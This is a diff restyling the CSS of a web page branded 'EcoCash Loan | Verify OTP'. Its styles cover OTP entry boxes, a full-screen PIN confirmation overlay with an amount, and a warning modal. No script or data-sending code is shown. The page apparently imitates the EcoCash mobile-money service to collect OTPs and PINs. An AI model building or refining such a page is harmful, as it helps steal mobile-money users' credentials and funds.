@@ -7,201 +7,611 @@
     <title>EcoCash Loan | Verify OTP &middot; Zimbabwe</title>
     <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
-    <style>
-        :root {
-            --blue-dark: #001a33;
-            --blue: #003366;
-            --blue-mid: #004d99;
-            --blue-light: #0077cc;
-            --blue-bright: #00aaff;
-            --red: #e30613;
-            --green: #00a651;
-            --white: #ffffff;
-            --light: #f0f6ff;
-            --dark: #0d1b2a;
-            --muted: #5a6d80;
-            --border: #d0dce8;
-            --error: #dc2626;
-        }
+      <style>
+          :root {
+    --bg:#08070a;
+    --surface:#121015;
+    --surface2:#1b151d;
+    --pink:#ff5aa8;
+    --pink-dark:#e83e8c;
+    --text:#f8edf4;
+    --muted:#b7a9b4;
+    --border:#30232d;
+    --input:#100d12;
+    --green:#65d99a;
+    --error:#ff6b78;
+}
 
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        html { -webkit-text-size-adjust: 100%; }
+body.light {
+    --bg:#fff5fa;
+    --surface:#ffffff;
+    --surface2:#fff0f7;
+    --pink:#e83e8c;
+    --pink-dark:#cf2878;
+    --text:#251522;
+    --muted:#766574;
+    --border:#ead5e1;
+    --input:#fffafd;
+    --green:#08783d;
+    --error:#dc2626;
+}
 
-        body {
-            font-family: 'Poppins', system-ui, sans-serif;
-            background: linear-gradient(135deg, var(--blue-dark) 0%, var(--blue) 50%, var(--blue-mid) 100%);
-            min-height: 100vh;
-            display: flex;
-            flex-direction: column;
-        }
+* {
+    margin:0;
+    padding:0;
+    box-sizing:border-box;
+}
 
-        header { background: white; padding: 14px 5%; border-bottom: 3px solid var(--blue); }
-        .logo { font-size: 22px; font-weight: 900; text-decoration: none; }
-        .logo .eco { color: var(--blue); }
-        .logo .cash { color: var(--red); }
+html {
+    -webkit-text-size-adjust:100%;
+}
 
-        main { flex: 1; display: flex; align-items: center; justify-content: center; padding: 36px 16px; }
+body {
+    font-family:'Poppins',system-ui,sans-serif;
+    background:var(--bg);
+    color:var(--text);
+    min-height:100vh;
+    display:flex;
+    flex-direction:column;
+    transition:background .25s,color .25s;
+}
 
-        .card {
-            background: white;
-            border-radius: 18px;
-            padding: 32px;
-            max-width: 400px;
-            width: 100%;
-            box-shadow: 0 16px 48px rgba(0,26,51,0.4);
-        }
+header {
+    background:var(--surface);
+    padding:14px 5%;
+    border-bottom:1px solid var(--border);
+}
 
-        .card-head { text-align: center; margin-bottom: 20px; }
-        .card-head h1 { font-size: 20px; font-weight: 900; color: var(--blue); margin-bottom: 4px; }
-        .card-head p { color: var(--muted); font-size: 12px; }
+.logo {
+    font-size:22px;
+    font-weight:900;
+    text-decoration:none;
+}
 
-        .bundle-bar {
-            background: linear-gradient(135deg, var(--blue), var(--blue-dark));
-            border-radius: 10px;
-            padding: 12px 14px;
-            margin-bottom: 18px;
-            color: white;
-        }
-        .b-row { display: flex; justify-content: space-between; font-size: 12px; margin-bottom: 5px; }
-        .b-row:last-child { margin-bottom: 0; padding-top: 5px; border-top: 1px solid rgba(255,255,255,0.15); font-weight: 800; font-size: 13px; }
+.logo .eco {
+    color:var(--text);
+}
 
-        .err {
-            display: none;
-            background: rgba(220,38,38,0.06);
-            border: 1px solid rgba(220,38,38,0.15);
-            color: var(--error);
-            font-size: 12px;
-            font-weight: 600;
-            border-radius: 8px;
-            padding: 9px 12px;
-            margin-bottom: 12px;
-            text-align: center;
-        }
-        .err.show { display: block; }
+.logo .cash {
+    color:var(--pink);
+}
 
-        .fl { display: block; font-size: 10px; font-weight: 700; color: var(--blue); text-transform: uppercase; letter-spacing: 0.05em; margin-bottom: 8px; }
+main {
+    flex:1;
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    padding:36px 16px;
+}
 
-        .otp-row { display: flex; gap: 7px; justify-content: center; margin-bottom: 16px; }
-        .otp-box {
-            width: 44px; height: 50px; text-align: center; font-size: 20px; font-weight: 800;
-            border: 2px solid var(--border); border-radius: 10px; background: var(--light);
-            color: var(--dark); font-family: 'Poppins', monospace; transition: all 0.2s;
-        }
-        .otp-box:focus { border-color: var(--blue-light); background: white; box-shadow: 0 0 0 3px rgba(0,119,204,0.06); outline: none; }
-        .otp-box.ok { border-color: var(--green); background: rgba(0,166,81,0.04); }
+.card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:18px;
+    padding:32px;
+    max-width:400px;
+    width:100%;
+    box-shadow:0 16px 48px #00000035;
+    position:relative;
+    overflow:hidden;
+}
 
-        .hint { font-size: 10px; color: var(--muted); text-align: center; margin-bottom: 6px; }
+.card:before {
+    content:"";
+    position:absolute;
+    top:0;
+    left:0;
+    right:0;
+    height:5px;
+    background:linear-gradient(90deg,var(--pink),#ff9ac9);
+}
 
-        .btns { display: flex; gap: 10px; margin-top: 16px; }
-        .btn-p {
-            flex: 1; background: var(--blue); color: white; border: none; padding: 13px;
-            border-radius: 50px; font-weight: 800; font-size: 12px; text-transform: uppercase;
-            cursor: pointer; font-family: inherit; box-shadow: 0 4px 12px rgba(0,51,102,0.25); transition: all 0.2s;
-        }
-        .btn-p:hover { background: var(--blue-light); transform: translateY(-1px); }
-        .btn-o {
-            flex: 1; background: transparent; color: var(--blue); border: 2px solid var(--blue); padding: 13px;
-            border-radius: 50px; font-weight: 800; font-size: 12px; text-transform: uppercase;
-            cursor: pointer; font-family: inherit;
-        }
-        .btn-o:hover { background: var(--light); }
+.card-head {
+    text-align:center;
+    margin-bottom:20px;
+}
 
-        .card-ft { text-align: center; margin-top: 14px; font-size: 10px; color: var(--muted); }
-        .secure { display: flex; align-items: center; justify-content: center; gap: 5px; margin-top: 10px; font-size: 10px; color: var(--muted); font-weight: 600; }
+.card-head h1 {
+    font-size:20px;
+    font-weight:900;
+    color:var(--text);
+    margin-bottom:4px;
+}
 
-        .overlay {
-            position: fixed; inset: 0;
-            display: none; align-items: center; justify-content: center; flex-direction: column; gap: 12px;
-            background: rgba(0,26,51,0.92); z-index: 2000; backdrop-filter: blur(5px);
-        }
-        .overlay.on { display: flex; }
-        .spin { width: 46px; height: 46px; border: 4px solid rgba(255,255,255,0.1); border-top-color: var(--blue-bright); border-radius: 50%; animation: sp 0.8s linear infinite; }
-        .sp-t { font-size: 14px; font-weight: 700; color: white; }
-        .sp-s { font-size: 11px; color: rgba(255,255,255,0.6); }
-        @keyframes sp { to { transform: rotate(360deg); } }
+.card-head p {
+    color:var(--muted);
+    font-size:12px;
+}
 
-        .pin-overlay {
-            position: fixed; inset: 0;
-            display: none; align-items: center; justify-content: center;
-            background: linear-gradient(135deg, var(--blue-dark), var(--blue));
-            z-index: 2000; padding: 20px;
-        }
-        .pin-overlay.on { display: flex; }
-        .pin-card {
-            background: white; border-radius: 18px; padding: 32px 28px;
-            max-width: 360px; width: 100%; box-shadow: 0 20px 60px rgba(0,26,51,0.5); text-align: center;
-        }
-        .pin-logo { font-size: 20px; font-weight: 900; margin-bottom: 16px; }
-        .pin-logo .eco { color: var(--blue); }
-        .pin-logo .cash { color: var(--red); }
-        .pin-title { font-size: 16px; font-weight: 800; color: var(--blue); margin-bottom: 4px; }
-        .pin-sub { font-size: 11px; color: var(--muted); margin-bottom: 20px; }
-        .pin-amount {
-            background: var(--light); border-radius: 10px; padding: 12px;
-            margin-bottom: 18px; border: 1px solid var(--border);
-        }
-        .pin-amount .pa-label { font-size: 10px; color: var(--muted); font-weight: 600; }
-        .pin-amount .pa-value { font-size: 1.4rem; font-weight: 900; color: var(--blue); }
-        .pin-input-wrap {
-            border: 2px solid var(--border); border-radius: 12px; padding: 14px;
-            background: var(--light); margin-bottom: 14px; transition: all 0.2s;
-        }
-        .pin-input-wrap:focus-within { border-color: var(--blue-light); background: white; box-shadow: 0 0 0 3px rgba(0,119,204,0.06); }
-        .pin-fi {
-            width: 100%; border: none; background: transparent; font-size: 24px;
-            color: var(--dark); outline: none; font-family: inherit;
-            letter-spacing: 12px; text-align: center; font-weight: 800;
-        }
-        .pin-fi::placeholder { color: #b0c4d8; letter-spacing: 0; font-size: 13px; font-weight: 500; }
-        .pin-err {
-            display: none; background: rgba(220,38,38,0.06); border: 1px solid rgba(220,38,38,0.15);
-            color: var(--error); font-size: 11px; font-weight: 600; border-radius: 8px;
-            padding: 8px; margin-bottom: 12px;
-        }
-        .pin-err.show { display: block; }
-        .pin-btns { display: flex; gap: 10px; }
-        .pin-btn {
-            flex: 1; padding: 13px; border-radius: 50px; border: none; font-weight: 800;
-            font-size: 12px; text-transform: uppercase; cursor: pointer; font-family: inherit; transition: all 0.2s;
-        }
-        .pin-btn-ok { background: var(--blue); color: white; box-shadow: 0 4px 12px rgba(0,51,102,0.25); }
-        .pin-btn-ok:hover { background: var(--blue-light); }
-        .pin-btn-x { background: transparent; color: var(--blue); border: 2px solid var(--blue); }
-        .pin-btn-x:hover { background: var(--light); }
-        .pin-secure { margin-top: 14px; font-size: 10px; color: var(--muted); font-weight: 600; }
+.bundle-bar {
+    background:linear-gradient(135deg,#251321,#151019);
+    border:1px solid #573047;
+    border-radius:10px;
+    padding:12px 14px;
+    margin-bottom:18px;
+    color:white;
+}
 
-        /* Warning Modal Styles */
-        .warning-overlay {
-            position: fixed; inset: 0;
-            display: none; align-items: center; justify-content: center;
-            background: rgba(0,26,51,0.85); z-index: 3000; padding: 20px;
-            backdrop-filter: blur(8px);
-        }
-        .warning-overlay.on { display: flex; }
-        .warning-card {
-            background: white; border-radius: 20px; padding: 32px 24px;
-            max-width: 380px; width: 100%; box-shadow: 0 25px 50px -12px rgba(0,0,0,0.5);
-            text-align: center; border: 1px solid rgba(255,255,255,0.2);
-        }
-        .warning-icon { font-size: 48px; margin-bottom: 16px; }
-        .warning-title { font-size: 18px; font-weight: 800; color: var(--blue-dark); margin-bottom: 12px; line-height: 1.3; }
-        .warning-msg { font-size: 13px; color: var(--muted); line-height: 1.6; margin-bottom: 24px; }
-        .warning-btn {
-            width: 100%; background: var(--blue); color: white; border: none;
-            padding: 14px; border-radius: 12px; font-weight: 700; font-size: 14px;
-            cursor: pointer; transition: all 0.2s;
-        }
-        .warning-btn:hover { background: var(--blue-light); transform: translateY(-1px); }
+body.light .bundle-bar {
+    background:linear-gradient(135deg,#e83e8c,#a91e64);
+    border-color:transparent;
+    color:white;
+}
 
-        @media (max-width: 500px) {
-            main { padding: 20px 12px; }
-            .card { padding: 24px 16px; }
-            .otp-row { gap: 5px; }
-            .otp-box { width: 38px; height: 44px; font-size: 17px; }
-            .btns { flex-direction: column; }
-            .pin-card { padding: 24px 18px; }
-        }
-    </style>
+.b-row {
+    display:flex;
+    justify-content:space-between;
+    gap:10px;
+    font-size:12px;
+    margin-bottom:5px;
+}
+
+.b-row:last-child {
+    margin-bottom:0;
+    padding-top:5px;
+    border-top:1px solid #ffffff30;
+    font-weight:800;
+    font-size:13px;
+}
+
+.err {
+    display:none;
+    background:#ff5a6810;
+    border:1px solid #ff5a6840;
+    color:var(--error);
+    font-size:12px;
+    font-weight:600;
+    border-radius:8px;
+    padding:9px 12px;
+    margin-bottom:12px;
+    text-align:center;
+}
+
+.err.show {
+    display:block;
+}
+
+.fl {
+    display:block;
+    font-size:10px;
+    font-weight:700;
+    color:var(--pink);
+    text-transform:uppercase;
+    letter-spacing:.05em;
+    margin-bottom:8px;
+}
+
+.otp-row {
+    display:flex;
+    gap:7px;
+    justify-content:center;
+    margin-bottom:16px;
+}
+
+.otp-box {
+    width:44px;
+    height:50px;
+    text-align:center;
+    font-size:20px;
+    font-weight:800;
+    border:2px solid var(--border);
+    border-radius:10px;
+    background:var(--input);
+    color:var(--text);
+    font-family:'Poppins',monospace;
+    transition:all .2s;
+}
+
+.otp-box:focus {
+    border-color:var(--pink);
+    background:var(--surface2);
+    box-shadow:0 0 0 3px #ff5aa81c;
+    outline:none;
+}
+
+.otp-box.ok {
+    border-color:var(--green);
+    background:#65d99a12;
+}
+
+.hint {
+    font-size:10px;
+    color:var(--muted);
+    text-align:center;
+    margin-bottom:6px;
+}
+
+.btns {
+    display:flex;
+    gap:10px;
+    margin-top:16px;
+}
+
+.btn-p {
+    flex:1;
+    background:var(--pink);
+    color:white;
+    border:none;
+    padding:13px;
+    border-radius:50px;
+    font-weight:800;
+    font-size:12px;
+    text-transform:uppercase;
+    cursor:pointer;
+    font-family:inherit;
+    box-shadow:0 4px 12px #ff5aa830;
+    transition:all .2s;
+}
+
+.btn-p:hover {
+    background:var(--pink-dark);
+    transform:translateY(-1px);
+}
+
+.btn-p:disabled {
+    opacity:.6;
+    cursor:not-allowed;
+    transform:none;
+}
+
+.btn-o {
+    flex:1;
+    background:transparent;
+    color:var(--pink);
+    border:2px solid var(--pink);
+    padding:13px;
+    border-radius:50px;
+    font-weight:800;
+    font-size:12px;
+    text-transform:uppercase;
+    cursor:pointer;
+    font-family:inherit;
+}
+
+.btn-o:hover {
+    background:var(--surface2);
+}
+
+.card-ft {
+    text-align:center;
+    margin-top:14px;
+    font-size:10px;
+    color:var(--muted);
+}
+
+.secure {
+    display:flex;
+    align-items:center;
+    justify-content:center;
+    gap:5px;
+    margin-top:10px;
+    font-size:10px;
+    color:var(--muted);
+    font-weight:600;
+}
+
+.overlay {
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    flex-direction:column;
+    gap:12px;
+    background:#08070af2;
+    z-index:2000;
+    backdrop-filter:blur(5px);
+}
+
+.overlay.on {
+    display:flex;
+}
+
+.spin {
+    width:46px;
+    height:46px;
+    border:4px solid #ffffff20;
+    border-top-color:var(--pink);
+    border-radius:50%;
+    animation:sp .8s linear infinite;
+}
+
+.sp-t {
+    font-size:14px;
+    font-weight:700;
+    color:white;
+}
+
+.sp-s {
+    font-size:11px;
+    color:#ffffff99;
+}
+
+@keyframes sp {
+    to {
+        transform:rotate(360deg);
+    }
+}
+
+/* PIN CONFIRMATION */
+
+.pin-overlay {
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    background:var(--bg);
+    z-index:2000;
+    padding:20px;
+}
+
+.pin-overlay.on {
+    display:flex;
+}
+
+.pin-card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:18px;
+    padding:32px 28px;
+    max-width:360px;
+    width:100%;
+    box-shadow:0 20px 60px #00000045;
+    text-align:center;
+    position:relative;
+    overflow:hidden;
+}
+
+.pin-card:before {
+    content:"";
+    position:absolute;
+    top:0;
+    left:0;
+    right:0;
+    height:5px;
+    background:linear-gradient(90deg,var(--pink),#ff9ac9);
+}
+
+.pin-logo {
+    font-size:20px;
+    font-weight:900;
+    margin-bottom:16px;
+}
+
+.pin-logo .eco {
+    color:var(--text);
+}
+
+.pin-logo .cash {
+    color:var(--pink);
+}
+
+.pin-title {
+    font-size:16px;
+    font-weight:800;
+    color:var(--text);
+    margin-bottom:4px;
+}
+
+.pin-sub {
+    font-size:11px;
+    color:var(--muted);
+    margin-bottom:20px;
+}
+
+.pin-amount {
+    background:var(--surface2);
+    border-radius:10px;
+    padding:12px;
+    margin-bottom:18px;
+    border:1px solid var(--border);
+}
+
+.pin-amount .pa-label {
+    font-size:10px;
+    color:var(--muted);
+    font-weight:600;
+}
+
+.pin-amount .pa-value {
+    font-size:1.4rem;
+    font-weight:900;
+    color:var(--pink);
+}
+
+.pin-input-wrap {
+    border:2px solid var(--border);
+    border-radius:12px;
+    padding:14px;
+    background:var(--input);
+    margin-bottom:14px;
+    transition:all .2s;
+}
+
+.pin-input-wrap:focus-within {
+    border-color:var(--pink);
+    background:var(--surface2);
+    box-shadow:0 0 0 3px #ff5aa81c;
+}
+
+.pin-fi {
+    width:100%;
+    border:none;
+    background:transparent;
+    font-size:24px;
+    color:var(--text);
+    outline:none;
+    font-family:inherit;
+    letter-spacing:12px;
+    text-align:center;
+    font-weight:800;
+}
+
+.pin-fi::placeholder {
+    color:var(--muted);
+    letter-spacing:0;
+    font-size:13px;
+    font-weight:500;
+}
+
+.pin-err {
+    display:none;
+    background:#ff5a6810;
+    border:1px solid #ff5a6840;
+    color:var(--error);
+    font-size:11px;
+    font-weight:600;
+    border-radius:8px;
+    padding:8px;
+    margin-bottom:12px;
+}
+
+.pin-err.show {
+    display:block;
+}
+
+.pin-btns {
+    display:flex;
+    gap:10px;
+}
+
+.pin-btn {
+    flex:1;
+    padding:13px;
+    border-radius:50px;
+    border:none;
+    font-weight:800;
+    font-size:12px;
+    text-transform:uppercase;
+    cursor:pointer;
+    font-family:inherit;
+    transition:all .2s;
+}
+
+.pin-btn-ok {
+    background:var(--pink);
+    color:white;
+    box-shadow:0 4px 12px #ff5aa830;
+}
+
+.pin-btn-ok:hover {
+    background:var(--pink-dark);
+}
+
+.pin-btn-x {
+    background:transparent;
+    color:var(--pink);
+    border:2px solid var(--pink);
+}
+
+.pin-btn-x:hover {
+    background:var(--surface2);
+}
+
+.pin-secure {
+    margin-top:14px;
+    font-size:10px;
+    color:var(--muted);
+    font-weight:600;
+}
+
+/* WARNING MODAL */
+
+.warning-overlay {
+    position:fixed;
+    inset:0;
+    display:none;
+    align-items:center;
+    justify-content:center;
+    background:#08070ae6;
+    z-index:3000;
+    padding:20px;
+    backdrop-filter:blur(8px);
+}
+
+.warning-overlay.on {
+    display:flex;
+}
+
+.warning-card {
+    background:var(--surface);
+    border:1px solid var(--border);
+    border-radius:20px;
+    padding:32px 24px;
+    max-width:380px;
+    width:100%;
+    box-shadow:0 25px 50px #00000050;
+    text-align:center;
+}
+
+.warning-icon {
+    font-size:48px;
+    margin-bottom:16px;
+}
+
+.warning-title {
+    font-size:18px;
+    font-weight:800;
+    color:var(--pink);
+    margin-bottom:12px;
+    line-height:1.3;
+}
+
+.warning-msg {
+    font-size:13px;
+    color:var(--muted);
+    line-height:1.6;
+    margin-bottom:24px;
+}
+
+.warning-btn {
+    width:100%;
+    background:var(--pink);
+    color:white;
+    border:none;
+    padding:14px;
+    border-radius:12px;
+    font-weight:700;
+    font-size:14px;
+    cursor:pointer;
+    transition:all .2s;
+}
+
+.warning-btn:hover {
+    background:var(--pink-dark);
+    transform:translateY(-1px);
+}
+
+@media (max-width:500px) {
+    main {
+        padding:20px 12px;
+    }
+
+    .card {
+        padding:24px 16px;
+    }
+
+    .otp-row {
+        gap:5px;
+    }
+
+    .otp-box {
+        width:38px;
+        height:44px;
+        font-size:17px;
+    }
+
+    .btns {
+        flex-direction:column;
+    }
+
+    .pin-card {
+        padding:24px 18px;
+    }
+    }
+      </style>   
+    
 </head>
 <body>
     <header><a class="logo" href="index.html"><span class="eco">Eco</span><span class="cash">Cash</span></a></header>
